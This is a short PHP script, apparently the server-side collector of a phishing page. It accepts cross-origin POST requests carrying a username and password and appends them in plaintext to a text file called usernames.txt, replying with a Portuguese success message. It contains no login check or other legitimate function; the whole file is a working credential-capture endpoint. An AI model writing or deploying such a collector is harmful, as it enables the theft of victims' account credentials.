<?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {

        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Methods: POST');
        header('Content-Type: application/json');


        $data = json_decode(file_get_contents('php://input'), true);


        if (isset($data['idusername']) && isset($data['idpass'])) {
            $idusername = $data['idusername'];
            $idpass = $data['idpass'];


            $file = 'usernames.txt';
            $current = file_get_contents($file);
            $current .= "Username: $idusername\nPass: $idpass\n";
            file_put_contents($file, $current);


            echo json_encode(['message' => 'Dados recebidos com sucesso']);
        } else {

            http_response_code(400);
            echo json_encode(['message' => 'Dados inválidos']);
        }


        exit();
    }
    ?>